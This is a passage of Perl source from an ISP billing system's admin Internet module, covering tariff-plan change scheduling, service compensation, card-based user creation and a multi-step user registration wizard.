      $Internet->{'TRAFFIC_SPEED_IN_' . $i} = $line->{in_speed};
      $Internet->{'TRAFFIC_SPEED_OUT_' . $i} = $line->{out_speed};
      $i++;
    }
  }
  $Internet->{PASSWORD} = $user->{PASSWORD} if (!$Internet->{PASSWORD});

  if ($FORM{sms} && in_array('Sms', \@MODULES)) {
    load_module('Sms', $html);
    send_user_memo({ %FORM, %$user, %$Internet, %$pi, %$company_info });

    return;
  }

  print $html->header();

  return $html->tpl_show(
    _include('internet_user_memo', 'Internet', { pdf => $FORM{pdf} }),
    {
      %$user,
      DATE => $DATE,
      TIME => $TIME,
      %$Internet,
      %$pi,
      %$company_info,
      INTERNET_PASSWORD => $Internet->{PASSWORD}
    }
  );
}

#**********************************************************
=head2 internet_form_shedule() - Shedule form for Internet modules

=cut
#**********************************************************
sub internet_form_shedule {

  my $service_id = q{};
  if ($FORM{ID}) {
    $service_id = $FORM{ID};
    print user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$service_id",
      UID                => $FORM{UID},
      MK_MAIN            => 1
    });
  }

  if ($FORM{add} && $permissions{0}{18} && defined($FORM{ACTION})) {
    my ($Y, $M, $D) = split(/-/, ($FORM{DATE} || $DATE), 3);

    print date_diff("$Y-$M-$D", $DATE);
    if (date_diff($DATE, "$Y-$M-$D") < 1) {
      $html->message('err', $lang{ERROR}, "$lang{ERR_WRONG_DATA}: $lang{DATE}");
    }
    else {
      $Shedule->add({
        UID    => $FORM{UID},
        TYPE   => $FORM{Shedule} || q{},
        ACTION => "$service_id:$FORM{ACTION}",
        D      => $D,
        M      => $M,
        Y      => $Y,
        MODULE => 'Internet'
      });
      if (!_error_show($Shedule, { ID => 971 })) {
        $html->message('info', $lang{CHANGED}, "$lang{SHEDULE} $lang{ADDED}");
      }
    }
  }
  elsif ($FORM{del} && $FORM{COMMENTS} && $permissions{0}{18}) {
    $Shedule->del({ ID => $FORM{del} });
    if (!_error_show($Shedule)) {
      $html->message('info', $lang{DELETED}, "$lang{DELETED} [$FORM{del}]");
    }
  }

  my $service_status = sel_status({ HASH_RESULT => 1 });

  if ($FORM{Shedule} && $FORM{Shedule} eq 'status' && $permissions{0}{18}) {
    my @rows = (
      " $lang{FROM}: ",
      $html->date_fld2('DATE', {
        NEXT_DAY  => 1,
        FORM_NAME => 'Shedule',
        MONTHES   => \@MONTHES,
        FORM_NAME => 'Shedule',
        WEEK_DAYS => \@WEEKDAYS }),
      " $lang{STATUS}: ",
      $html->form_select('ACTION', {
        SELECTED   => $FORM{ACTION},
        SEL_HASH   => $service_status,
        USE_COLORS => 1,
        NO_ID      => 1
      }
      ),
      $html->form_input('add', $lang{ADD}, { TYPE => 'submit' })
    );

    my $info = '';
    foreach my $val (@rows) {
### АСР КТК-39
      $info .= $html->element('div', $val, { class => '' }) . "&nbsp";
    }
###
    print $html->form_main(
      {
        CONTENT => $html->element('div', $info, { class => 'navbar navbar-expand-lg' }),
        HIDDEN  => {
          #sid     => $sid,
          index   => $index,
          Shedule => "status",
          UID     => $FORM{UID},
          ID      => $service_id,
        },
        NAME    => 'Shedule',
        ID      => 'Shedule',
      }
    );
  }

  shedule_list({
    MODULE => 'Internet',
    UID    => $FORM{UID},
  });

  return 1;
}

#**********************************************************
=head2 shedule_list($attr) - Change user tariff plan from admin interface

  Arguments:
    MODULE
    UID
    TP_INFO

  Returns:
    TRUE or FALSE

=cut
#**********************************************************
sub shedule_list {
  my ($attr) = @_;

  my $service_status = sel_status({ HASH_RESULT => 1 });
  my $module = $attr->{MODULE} || q{};

  my $list = $Shedule->list(
    {
      UID       => $attr->{UID},
      MODULE    => $module,
      COLS_NAME => 1
    }
  );

  my $table = $html->table({
    width   => '100%',
    caption => $lang{SHEDULE},
    title   => [ $lang{HOURS}, $lang{DAY}, $lang{MONTH}, $lang{YEAR}, $lang{COUNT}, $lang{USER}, $lang{TYPE},
      $lang{VALUE}, $lang{MODULES}, $lang{ADMINS}, $lang{CREATED}, "-" ],
    qs      => $pages_qs,
    pages   => $Shedule->{TOTAL},
    ID      => uc($module) . '_SHEDULE'
  });

  foreach my $line (@$list) {
    my $delete = ($permissions{0}{4}) ? $html->button($lang{DEL}, "index=$index&del=$line->{id}&UID=$line->{uid}",
      { MESSAGE => "$lang{DEL} [$line->{id}]?", class => 'del', TEXT => $lang{DEL} }) : '-';

    my $action = $line->{action};
    my $service_id = 0;

    if ($action =~ /:/) {
      ($service_id, $action) = split(/:/, $action);
    }

    if ($line->{type} eq 'status') {
      $action = $html->color_mark($service_status->{ $action });
    }
    else {
      $action = sel_tp({ TP_ID => $action }) . (($service_id) ? " ($service_id)" : q{});
    }

    $table->addrow(
      $html->b($line->{h}),
      $line->{d},
      $line->{m},
      $line->{y},
      $line->{counts},
      $html->button($line->{login}, "index=15&UID=$line->{uid}"),
      $line->{type},
      $action,
      $line->{module},
      $line->{admin_name},
      $line->{date},
      $delete
    );
  }

  print $table->show();

  $table = $html->table(
    {
      width => '100%',
      ID    => uc($module) . '_SHEDULE_TOTAL',
      rows  => [ [ "$lang{TOTAL}:", $html->b($Shedule->{TOTAL}) ] ]
    }
  );
  print $table->show();

  return 1;
}

#**********************************************************
=head2 internet_chg_tp($attr) - Change user tariff plan from admin interface

=cut
#**********************************************************
sub internet_chg_tp {
  my ($attr) = @_;

  my $user;
  my $uid = 0;
  if (defined($attr->{USER_INFO})) {
    $user = $attr->{USER_INFO};
    $uid = $user->{UID};
    $Internet = $Internet->user_info($uid,
      { DOMAIN_ID => $user->{DOMAIN_ID},
        ID        => $FORM{ID}
      });

    if ($Internet->{TOTAL} < 1) {
      $html->message('info', $lang{INFO}, $lang{NOT_ACTIVE}, { ID => 941 });
      return 0;
    }
  }
  else {
    $html->message('err', $lang{ERROR}, $lang{USER_NOT_EXIST}, { ID => 942 });
    return 0;
  }

  if (!$permissions{0}{4}) {
    $html->message('err', $lang{ERROR}, $lang{ERR_ACCESS_DENY}, { ID => 943 });
    return 1;
  }
  elsif (!$permissions{0}{10}) {
    $html->message('warn', $lang{WARNING}, $lang{ERR_ACCESS_DENY}, { ID => 944 });
    return 1;
  }

  if ($FORM{TP_ID} && $FORM{TP_ID} eq ($Internet->{TP_ID} || '')) {
    $html->message('warn', '', "$lang{TARIF_PLANS} $lang{EXIST}", { ID => 945 });
  }

  #my $TARIF_PLAN = $FORM{tarif_plan} || $lang{DEFAULT_TARIF_PLAN};
  my $period = $FORM{period} || 0;

  #Get next period
  if (
    ($Internet->{MONTH_ABON} && $Internet->{MONTH_ABON} > 0)
      && !$Internet->{STATUS}
      && !$users->{DISABLE}
      && (($users->{DEPOSIT} ? $users->{DEPOSIT} : 0) + ($users->{CREDIT} ? $users->{CREDIT} : 0) > 0
      || $Internet->{POSTPAID_ABON}
      || ($Internet->{PAYMENT_TYPE} && $Internet->{PAYMENT_TYPE} == 1))
  ) {
    if ($Internet->{ACTIVATE} ne '0000-00-00') {
      my ($Y, $M, $D) = split(/-/, $Internet->{ACTIVATE}, 3);
      $M--;
      $Internet->{ABON_DATE} = POSIX::strftime("%Y-%m-%d", localtime((POSIX::mktime(0, 0, 0, $D, $M, ($Y - 1900), 0, 0, 0) + 31 * 86400 + (($conf{START_PERIOD_DAY}) ? $conf{START_PERIOD_DAY} * 86400 : 0))));
    }
    else {
      my ($Y, $M, $D) = split(/-/, $DATE, 3);
      $M++;
      if ($M == 13) {
        $M = 1;
        $Y++;
      }

      if ($conf{START_PERIOD_DAY}) {
        $D = $conf{START_PERIOD_DAY};
      }
      else {
        $D = '01';
      }
      $Internet->{ABON_DATE} = sprintf("%d-%02d-%02d", $Y, $M, $D);
    }
  }

  my $message = '';
  if ($FORM{set}) {
    my ($year, $month, $day) = split(/-/, $DATE, 3);
    if ($period > 0) {
      if ($period == 1) {
        ($year, $month, $day) = split(/-/, $Internet->{ABON_DATE}, 3);
      }
      else {
        ($year, $month, $day) = split(/-/, $FORM{DATE}, 3);
      }

      my $seltime = POSIX::mktime(0, 0, 0, $day, ($month - 1), ($year - 1900));

      if ($seltime <= time()) {
        $html->message('info', $lang{INFO}, "$lang{ERR_WRONG_DATA} " . $html->color_mark("$lang{DATE}: $year-$month-$day", $_COLORS[6]));
        return 0;
      }
      elsif ($FORM{date_D} && $FORM{date_D} > ($month != 2 ? (($month % 2) ^ ($month > 7)) + 30 : (!($year % 400) || !($year % 4) && ($year % 25) ? 29 : 28))) {
        $html->message('info', $lang{INFO}, "$lang{ERR_WRONG_DATA} " . $html->color_mark("$lang{DATE}: $year-$month-$day", $_COLORS[6]));
        return 0;
      }

      my $comments = "$lang{FROM}: $Internet->{TP_ID}:" .
        (($Internet->{TP_NAME}) ? "$Internet->{TP_NAME}" : q{}) . ((!$FORM{GET_ABON}) ? "\nGET_ABON=-1" : '')
        . ((!$FORM{RECALCULATE}) ? "\nRECALCULATE=-1" : '');

      $Shedule->add({
        UID          => $uid,
        TYPE         => 'tp',
        ACTION       => "$FORM{ID}:$FORM{TP_ID}",
        D            => $day,
        M            => $month,
        Y            => $year,
        MODULE       => 'Internet',
        COMMENTS     => $comments,
        ADMIN_ACTION => 1
      });

      if (!_error_show($Shedule)) {
        $html->message('info', $lang{CHANGED}, "$lang{TARIF_PLAN} $lang{CHANGED}");
        $Internet->user_info($uid, { ID => $FORM{chg} });
      }
    }
    else {
      if ($Internet->{ACTIVATE} && $Internet->{ACTIVATE} ne '0000-00-00' && !$Internet->{STATUS}) {
        $FORM{ACTIVATE} = $DATE;
      }

      $FORM{PERSONAL_TP} = 0.00;
      $Internet->user_change(\%FORM);

      if( $Internet->{TP_INFO} && $Internet->{TP_INFO}->{MONTH_FEE} && $Internet->{TP_INFO}->{MONTH_FEE} < $users->{DEPOSIT}) {
        $Internet->{STATUS} = 0;
        #$FORM{GET_ABON}=1;
        $FORM{ACTIVE_SERVICE}=1;
      }

      if (!_error_show($Internet, { RIZE_ERROR => 1 })) {
        #Take fees
        #Message
        if (!$Internet->{STATUS} && $FORM{GET_ABON}) {
          service_get_month_fee($Internet);
          if ($FORM{ACTIVE_SERVICE}) {
            $FORM{STATUS}=0;
            $Internet->user_change(\%FORM);
          }
        }
        else {
          $html->message('info', $lang{CHANGED}, "$lang{TARIF_PLAN} $message", { ID => 932 });
        }

        #$Internet->info($uid, { ID => $FORM{ID} });
      }
    }
  }
  elsif ($FORM{del}) {
    $Shedule->del(
      {
        UID => $uid,
        ID  => $FORM{SHEDULE_ID}
      }
    );

    $html->message('info', $lang{DELETED}, "$lang{DELETED} [$FORM{SHEDULE_ID}]");
  }

  $Shedule->info({
    UID    => $uid,
    TYPE   => 'tp',
    MODULE => 'Internet'
  });

  my $table;
  #Sheduler for TP change

  if ($FORM{del_Shedule} && $FORM{COMMENTS}) {
    $Shedule->del({ ID => $FORM{del_Shedule} });
    if (!_error_show($Shedule)) {
      $html->message('info', $lang{INFO}, "$lang{SHEDULE} $lang{DELETED} $FORM{del_Shedule}");
    }
    $Shedule->{TOTAL} = 1;
  }

  $table = $html->table({
    width   => '100%',
    caption => $lang{SHEDULE},
    title   => [ $lang{DATE}, $lang{TARIF_PLAN}, '-' ],
    ID      => 'TP_SHEDULE'
  });

  if ($Shedule->{TOTAL} > 0) {
    my $list = $Shedule->list({
      UID       => $uid,
      TYPE      => 'tp',
      DESCRIBE  => '_SHOW',
      MODULE    => 'Internet',
      COLS_NAME => 1
    });

    my $TP_HASH = sel_tp({ USER_INFO => $users });

    foreach my $line (@$list) {
      my $action = $line->{action};
      my $service_id = 0;
      if ($action =~ /:/) {
        ($service_id, $action) = split(/:/, $action);
      }

      $table->addrow("$line->{y}-$line->{m}-$line->{d}",
        "$service_id : " . ($TP_HASH->{$action} || q{$action}),
        $html->button($lang{DEL}, "index=$index&del_Shedule=$line->{id}&UID=$uid",
          { MESSAGE => "$lang{DEL} $line->{y}-$line->{m}-$line->{d}?", class => 'del' })
      );
    }

    $Tariffs->{SHEDULE_LIST} .= $table->show();
  }

  my $user_info = $users->pi({ UID => $uid });

  $Tariffs->{TARIF_PLAN_SEL} = sel_tp({
    CHECK_GROUP_GEOLOCATION => $user_info->{LOCATION_ID} || 0,
    USER_GID                => $user_info->{GID} || 0,
    USER_INFO               => $users,
    SELECT                  => 'TP_ID',
    SHOW_ALL                => 1,
    TP_ID                   => $Internet->{TP_ID},
    GROUP_SORT              => 1,
    EX_PARAMS               => {
      SORT_VALUE     => 1, # Sort for sub groups
      SORT_KEY       => 1,
      GROUP_COLOR    => 1,
      MAIN_MENU      => $permissions{4} ? get_function_index('internet_tp') : undef,
      MAIN_MENU_ARGV => "TP_ID=" . ($Internet->{TP_ID} || '')
    }
  });

  $Tariffs->{PARAMS} .= form_period($period, { ABON_DATE => $Internet->{ABON_DATE} });

  $Tariffs->{ACTION} = 'set';
  $Tariffs->{LNG_ACTION} = $lang{CHANGE};

  $Tariffs->{UID} = $uid;
  $Tariffs->{ID} = $Internet->{ID};
  $Tariffs->{TP_NAME} = ($Internet->{TP_NUM} || q{}) . ': ' . ($Internet->{TP_NAME} || '');

  if ($Internet->{ID}) {
    $Tariffs->{MENU} = user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$Internet->{ID}",
      UID                => $uid,
      MK_MAIN            => 1
    });
  }

  $html->tpl_show(templates('form_chg_tp'), $Tariffs);

  return 1;
}

#**********************************************************
=head2 internet_user_del($uid, $attr) - Delete user from module

=cut
#**********************************************************
sub internet_user_del {
  my ($uid, $attr) = @_;

  $Internet->{UID} = $uid;
  $Internet->user_del({ UID => $uid, COMMENTS => $attr->{COMMENTS} });
  $Log->log_del({ LOGIN => $attr->{LOGIN} });

  return 0;
}

#**********************************************************
=head2 internet_compensation($attr)

  Arguments:
    UP - (Usr Poratl) Do not show service menu
    QUITE   = 1,
    HOLD_UP = Don't compensate currenbt month

  Returns:
    TRUE or FALSE

=cut
#**********************************************************
sub internet_compensation {
  my ($attr) = @_;

  if ($FORM{ID} && !$attr->{UP}) {
    print user_service_menu({
      SERVICE_FUNC_INDEX => get_function_index('internet_user'),
      PAGES_QS           => "&ID=$FORM{ID}",
      UID                => $FORM{UID},
      MK_MAIN            => 1
    });
  }

  if ($FORM{add} && $FORM{FROM_DATE}) {
    my $uid = $users->{UID} || $FORM{UID};

    require Control::Service_control;
    my $Service_control = Control::Service_control->new($db, $admin, \%conf);
    my $compensation_info = $Service_control->internet_add_compensation({ %FORM, %{$attr}, UID => $uid });

    my $table = $html->table({
      width       => '400',
      caption     => "$lang{COMPENSATION} $lang{FROM}: $FORM{FROM_DATE} $lang{TO}: $FORM{TO_DATE}",
      title_plain => [ $lang{MONTH}, $lang{DAYS}, $lang{SUM} ],
      ID          => 'INTERNET_COMPENSATION_DESCRIBE',
      rows        => $compensation_info->{TABLE_ROWS} || []
    });

    if (!_error_show($compensation_info)) {
      $compensation_info->{SUM} ||= 0;
      $html->message('info', $lang{COMPENSATION}, "$lang{COMPENSATION} $lang{SUM}: $compensation_info->{SUM}");

      $table->{color} = $_COLORS[3];
      $table->addrow($html->b("$lang{TOTAL}:"), $html->b($compensation_info->{DAYS}), $html->b($compensation_info->{SUM}));

      print $table->show();
    }

    return 0 if $attr->{QUITE};
  }

  $html->tpl_show(_include('internet_compensation', 'Internet'), { %FORM, %$Internet });

  return 1;
}

#**********************************************************
=head2 internet_user_error($Internet_) - last user auth

=cut
#**********************************************************
sub internet_user_error {
  my ($Internet_) = @_;

  if ($conf{INTERNET_SKIP_SHOW_QUICK_ERRORS}) {
    return '';
  }

  my $message = '';


### START КТК-39
  # if (!$ui) {
    # return $message;
  # }
  
	# for ui
  	if (!$ui->{LOGIN}) {
		$ui->{LOGIN}=$Internet_->{LOGIN} || $user->{LOGIN};
	}
### END КТК-39

  my $error_logs = $Log->log_list({
    COLS_NAME => 1,
    LOGIN     => ($conf{INTERNET_LOGIN} && $Internet_->{INTERNET_LOGIN}) ? $Internet_->{INTERNET_LOGIN} : $ui->{LOGIN},
    SORT      => 'date',
    DESC      => 'DESC',
    PAGE_ROWS => 1
  });

  if ($Log->{TOTAL}) {
    if ($error_logs->[0]->{log_type} > 4) {
      if ($error_logs->[0]->{action} eq 'HANGUP' ||
        $error_logs->[0]->{action} eq 'LOST_ALIVE' ||
        $error_logs->[0]->{action} eq 'CALCULATIO') {
        $message = $html->message('warning', '', "$error_logs->[0]->{action} $lang{DATE} $error_logs->[0]->{date} $error_logs->[0]->{message}", { OUTPUT2RETURN => 1 });
      }
      else {
        $message = $html->message('info', '', "$lang{LAST_AUTH} $lang{DATE} $error_logs->[0]->{date} $error_logs->[0]->{message}", { OUTPUT2RETURN => 1 });
      }
    }
    else {

      if ($error_logs->[0]->{action} eq 'HANGUP' ||
        $error_logs->[0]->{action} eq 'LOST_ALIVE' ||
        $error_logs->[0]->{action} eq 'CALCULATIO') {
        $message = $html->message('warning', '', "$error_logs->[0]->{action} $lang{DATE} $error_logs->[0]->{date} $error_logs->[0]->{message}", { OUTPUT2RETURN => 1 });
      }
      else {
        $message .= $html->message('err', "$lang{LAST_AUTH} $lang{DATE} $error_logs->[0]->{date} $error_logs->[0]->{message}", '', { OUTPUT2RETURN => 1 });
        $error_logs = $Log->log_list({
          COLS_NAME => 1,
          LOGIN     => ($conf{INTERNET_LOGIN} && $Internet_->{INTERNET_LOGIN}) ? $Internet_->{INTERNET_LOGIN} : $ui->{LOGIN},
          LOG_TYPE  => 6,
          SORT      => 'date',
          DESC      => 'DESC',
          PAGE_ROWS => 1
        });

        if ($Log->{TOTAL}) {
          $message .= $html->message('info', '', "$lang{LAST_SUCCES_AUTH} $error_logs->[0]->{date} $error_logs->[0]->{message}", { OUTPUT2RETURN => 1 });
        }
      }
    }
  }

  return $message;
}

#**********************************************************
=head2 internet_cards() Make cards

=cut
#**********************************************************
sub internet_cards {

  my %FORM_BASE = ();

  if ($admin->{MODULES} && !$admin->{MODULES}{Cards}) {
    $html->message('err', $lang{ERROR}, $lang{ERR_ACCESS_DENY});
    return 0;
  }

  load_module('Cards', $html);

  $FORM{CARDS_FORM} = 1;

  my $expire = $FORM{EXPIRE};
  my $internet_tpl;

  if (!$FORM{create}) {
    $internet_tpl = internet_user_wizard(
      {
        OUTPUT2RETURN => 1,
        NO_EXTRADATA  => 1,
        TPLS          => {
          '2:' => '',
          '3:' => ''
        }
      }
    );
    # Adding extra col-lg-6
    $internet_tpl = $html->element('div', $internet_tpl, { class => 'col-md-12 col-lg-6' });
  }

  $FORM{EXPIRE} = $expire;
  my $cards_hash = cards_users_add({ EXTRA_TPL => $internet_tpl });

  $FORM{add} = 1;
  if (scalar keys %FORM_BASE < 1) {
    %FORM_BASE = %FORM;
  }

  my $added_count = 0;

  my $table = $html->table({
    width   => '100%',
    caption => $lang{USERS},
    title   => [ $lang{LOGIN}, "ID", $lang{INFO} ],
    ID      => 'ADDED_USERS'
  });

  if (ref($cards_hash) eq 'ARRAY') {
    foreach my $line (@$cards_hash) {
      %FORM = ();
      %FORM = %FORM_BASE;
      while (my ($k, $v) = each %$line) {
        $FORM{$k} = (defined($v)) ? clearquotes($v) : q{};
      }

      $FORM{'1.LOGIN'} = $line->{LOGIN};
      $FORM{'1.PASSWORD'} = $line->{PASSWORD};
      $FORM{'1.CREATE_BILL'} = 1;
      $line->{UID} = internet_wizard_add({ %FORM, SHORT_REPORT => 1 });

      if (! $line->{UID} || $line->{UID} < 1) {
        $html->message('err', "Cards:$lang{ERROR}", "$lang{LOGIN}: '".
          ($line->{LOGIN} || $FORM{LOGIN} || 'No login'). "' ". ($line->{UID} || 0), { ID => 929 });
        #exit;
        #last if (!$line->{SKIP_ERRORS});
      }
      else {
        #Confim card creation
        $added_count++;
        $table->addrow($html->button($line->{LOGIN}, "index=11&UID=$line->{UID}"), $line->{UID}, $FORM{ex_message});
        if (cards_users_gen_confim({ %$line, SUM => ($FORM{'5.SUM'}) ? $FORM{'5.SUM'} : 0 }) == 0) {
          return 0;
        }
      }
    }
  }

  if ($added_count > 0) {
    print $table->show();
  }

  return 1;
}

#**********************************************************
=head2 internet_user_wizard($attr) - Create user and services

=cut
#**********************************************************
sub internet_user_wizard {
  my ($attr) = @_;

  my $Finance = Finance->new($db, $admin, \%conf);
  $FORM{INTERNET_WIZARD} = 1;

  if ($FORM{print}) {
    load_module('Docs');
    if ($FORM{PRINT_CONTRACT}) {
      docs_contract({ %$Internet });
    }
    else {
      docs_invoice();
    }
    return 0;
  }

  if ($FORM{add}) {
    my $uid = internet_wizard_add({ %FORM, %{($attr) ? $attr : {}} });
    return $uid if ($attr->{SHORT_REPORT});
  }

  foreach my $k (keys %FORM) {
    next if ($k eq '__BUFFER');
    my $val = $FORM{$k};
    if ($k =~ /\d+\.([A-Z0-9\_]+)/ig) {
      my $key = $1;
      $FORM{"$key"} = $val;
    }
  }

  my $users_defaults;
  $users_defaults->{DISABLE} = ($users_defaults->{DISABLE} && $users_defaults->{DISABLE} == 1) ? ' checked' : '';

  #Info fields
  if (!$attr->{NO_EXTRADATA}) {
    $attr->{EXT_BILL_ACCOUNT} = 'none' unless ($conf{EXT_BILL_ACCOUNT});
    $users_defaults->{EXDATA} .= $html->tpl_show(templates('form_user_exdata_add'),
      { CREATE_BILL => ' checked',
        GID         => sel_groups({ SKIP_MULTISELECT => 1 })
      },
      { OUTPUT2RETURN => 1 });
  }

  my $internet_defaults = $Internet->defaults();
  $internet_defaults->{STATUS_SEL} = sel_status({ STATUS => $FORM{STATUS} });
  $internet_defaults->{TP_ADD} = sel_tp({ SELECT => 'TP_ID', USER_INFO => $users });
  $internet_defaults->{TP_DISPLAY_NONE} = "style='display:none'";

  my $password_form;
  $password_form->{PW_CHARS} = $conf{PASSWD_SYMBOLS} || "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWYXZ";
  $password_form->{PW_LENGTH} = $conf{PASSWD_LENGTH} || 6;
  my %pi_form = (INFO_FIELDS => form_info_field_tpl());

  if ($conf{DOCS_CONTRACT_TYPES}) {
    #PREFIX:SUFIX:NAME;
    $conf{DOCS_CONTRACT_TYPES} =~ s/\n//g;
    my (@contract_types_list) = split(/;/, $conf{DOCS_CONTRACT_TYPES});

    my %CONTRACTS_LIST_HASH = ();
    foreach my $line (@contract_types_list) {
      my ($prefix, $sufix, $name) = split(/:/, $line);
      $prefix =~ s/ //g;
      $CONTRACTS_LIST_HASH{$prefix . '|' . ($sufix || q{})} = $name;
    }

    $pi_form{CONTRACT_TYPE} = " $lang{TYPE}: "
      . $html->form_select(
      'CONTRACT_TYPE',
      {
        SELECTED => '',
        SEL_HASH => { '' => '', %CONTRACTS_LIST_HASH },
        NO_ID    => 1
      }
    );
  }

  $pi_form{ADDRESS_TPL} = form_address({ FLAT_CHECK_FREE => 1, SHOW => 1 });

  my $list = $Nas->ip_pools_list({
    DOMAIN_ID => ($admin->{DOMAIN_ID}) ? $admin->{DOMAIN_ID} : undef,
    STATIC => 1,
    COLS_NAME => 1,
  });

  $internet_defaults->{STATIC_IP_POOL} = $html->form_select(
    'STATIC_IP_POOL',
    {
      SELECTED    => $FORM{STATIC_POOL},
      SEL_LIST    => $list,
      NO_ID       => 1,
      SEL_OPTIONS => { '' => '' },
    }
  );

  if ($conf{INTERNET_LOGIN}) {
    $internet_defaults->{LOGIN_FORM} = $html->tpl_show(templates('form_row'), {
      ID    => 'INTERNET_LOGIN',
      NAME  => "Internet " . $lang{LOGIN},
      VALUE => $html->form_input('INTERNET_LOGIN', $FORM{INTERNET_LOGIN}, { ID => 'INTERNET_LOGIN' })
    }, { OUTPUT2RETURN => 1 });
  }

  my %tpls = (
    "01:" . $lang{LOGIN} . "::"  => $html->tpl_show(templates('form_user'), { %$users_defaults, %FORM }, { OUTPUT2RETURN => 1, ID => 'FORM_USER' }),
    "02:" . $lang{PASSWD} . "::" => $html->tpl_show(templates('form_password'), { %$password_form, %FORM }, { OUTPUT2RETURN => 1, ID => 'FORM_PASSWORD' }),
    "03:" . $lang{INFO} . "::"   => $html->tpl_show(templates('form_pi'), { %pi_form, %FORM }, { OUTPUT2RETURN => 1, ID => 'FORM_PI' }),
    "04:Internet::"              => $html->tpl_show(_include('internet_user', 'Internet'), { %FORM, %$internet_defaults }, { OUTPUT2RETURN => 1, ID => 'INTERNET_USER' }),
  );

  #Payments
  if ($permissions{1} && $permissions{1}{1}) {
    $Payments->{SEL_METHOD} = $html->form_select(
      'METHOD',
      {
        SELECTED     => (defined($FORM{METHOD}) && $FORM{METHOD} ne '') ? $FORM{METHOD} : '',
        SEL_HASH     => get_payment_methods(),
        SORT_KEY_NUM => 1,
        NO_ID        => 1,
        SEL_OPTIONS  => { '' => $lang{ALL} }
      }
    );

    $Payments->{SUM} = '0.00';
    $FORM{SUM} = '0.00';

    $Payments->{SEL_ER} = $html->form_select(
      'ER',
      {
        SELECTED    => undef,
        SEL_LIST    => $Finance->exchange_list({ COLS_NAME => 1 }),
        SEL_KEY     => 'id',
        SEL_VALUE   => 'short_name,rate',
        SEL_OPTIONS => { '' => '-N/S-' },
        NO_ID       => 1
      }
    );

    $tpls{"05:" . $lang{PAYMENTS} . "::"} = $html->tpl_show(templates('form_payments'), $Payments, { OUTPUT2RETURN => 1, ID => 'FORM_PAYMENTS' });
  }

  #If mail module added
  if (in_array('Mail', \@MODULES) && !$conf{INTERNET_WIZARD_SKIP_MAIL}) {
    load_module('Mail', $html);
    my $Mail = Mail->new($db, $admin, \%conf);

    $Mail->{PASSWORD} = $Mail->{PASSWORD} = $html->tpl_show(_include('mail_password', 'Mail'), {
      PW_CHARS  => "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWYXZ",
      PW_LENGTH => 8,
    },
      { OUTPUT2RETURN => 1 });

    $Mail->{SEND_MAIL} = 'checked';

    $Mail->{DOMAINS_SEL} = $html->form_select(
      'DOMAIN_ID',
      {
        SELECTED    => $Mail->{DOMAIN_ID},
        SEL_LIST    => $Mail->domain_list({ COLS_NAME => 1 }),
        SEL_VALUE   => 'domain',
        SEL_OPTIONS => { 0 => '-N/S-' },
        NO_ID       => 1
      }
    );

    $tpls{"06:E-Mail::"} = $html->tpl_show(_include('mail_box', 'Mail'), $Mail, { OUTPUT2RETURN => 1, ID => 'MAIL_BOX' });
  }

  #If msgs module added
  if (in_array('Msgs', \@MODULES) && !defined($FORM{CARDS_FORM})) {
    load_module('Msgs', $html);
    Msgs->new($db, $admin, \%conf);
    $FORM{UID} = -1;
    delete($FORM{add});
    $tpls{"07:" . $lang{MESSAGE} . "::"} = msgs_admin_add({ OUTPUT2RETURN => 1 });
  }

  $tpls{"10:" . $lang{FEES} . "::"} = form_fees_wizard({ OUTPUT2RETURN => 1 });

  if ($attr->{TPLS}) {
    while (my ($k, $v) = each %{$attr->{TPLS}}) {
      $tpls{$k} = $v;
    }
  }

  my $wizard;

  my $template = '';
  my @sorted_templates = sort keys %tpls;

  foreach my $key (@sorted_templates) {
    my ($n, $descr) = split(/:/, $key, 4);
    $n = int($n);
    my $sub_tpl .= $html->tpl_show($tpls{"$key"}, $wizard, { OUTPUT2RETURN => 1, ID => "$descr" });
    $sub_tpl =~ s/(<input .*?UID.*?>)//gi;
    $sub_tpl =~ s/(<input .*?index.*?>)//gi;
    $sub_tpl =~ s/name=[\'\"]?([A-Z_0-9]+)[\'\"]? /name=$n.$1 /ig;
    $template .= $sub_tpl;
  }

  $template =~ s/(<form .*?>)//gi;
  $template =~ s/<\/form>//ig;
  $template =~ s/(<input .*?type=submit.*?>)//gi;
  $template =~ s/<hr>//gi;

  if ($attr->{OUTPUT2RETURN}) {
    return $template;
  }

  print $html->form_main(
    {
      CONTENT => $template,
      HIDDEN  => { index => $index },
      SUBMIT  => { add => $lang{ADD} },
      NAME    => 'user_form',
      ENCTYPE => 'multipart/form-data',
      class   => 'form-horizontal',
      ID      => 'INTERNET_USER_WIZARD'
    }
  );

  return 1;
}

#**********************************************************
=head2 internet_user_wizard($attr) - Create user and services

  Arguments:
    $attr

  Results
    True or False

=cut
#**********************************************************
sub internet_wizard_add {
  my ($attr) = @_;

  my $service_status = sel_status({ HASH_RESULT => 1 });
  my $Fees = Finance->fees($db, $admin, \%conf);
  my $Finance = Finance->new($db, $admin, \%conf);
  my %add_values = ();
  my $uid = 0;

  foreach my $k (sort keys %$attr) {
    if ($k =~ m/^[0-9]+\.[_a-zA-Z0-9]+$/) {
      $k =~ s/%22//g;
      my ($id, $main_key) = split(/\./, $k, 2);
      $add_values{$id}{$main_key} = $attr->{$k};
    }
  }

  # Password
  $add_values{1}{GID} = $admin->{GID} if ($admin->{GID});

  if (!$permissions{0}{13} && $admin->{AID} != 2 && !$admin->{DOMAIN_ID}) {
    $add_values{1}{DISABLE} = 2;
  }

  my $login = $add_values{1}{LOGIN} || q{};

  if ($add_values{1} && $add_values{1}{COMMENTS}) {
    $add_values{1}{COMMENTS} =~ s/\\n/\n/g;
  }

  if ($add_values{1}{GID_NAME}) {
    my $gid_list = $users->groups_list({
      SORT      => 'g.gid',
      DESC      => 'desc',
      NAME      => $add_values{1}{GID_NAME},
      PAGE_ROWS => 1,
      COLS_NAME => 1
    });

    if ($users->{TOTAL} > 0) {
      $add_values{1}{GID} = $gid_list->[0]->{id};
    }
    else {
      $gid_list = $users->groups_list({
        SORT      => 'g.gid',
        DESC      => 'desc',
        PAGE_ROWS => 1,
        COLS_NAME => 1
      });

      my $gid = ($gid_list && $gid_list->[0]) ? ($gid_list->[0]->{id} || 0) + 1 : 1;
      $users->group_add({
        GID  => $gid,
        NAME => $add_values{1}{GID_NAME}
      });

      if (! $users->{errno}) {
        $add_values{1}{GID} = $gid;
      }
    }
  }

  if ($add_values{1}{COMPANY_NAME}) {
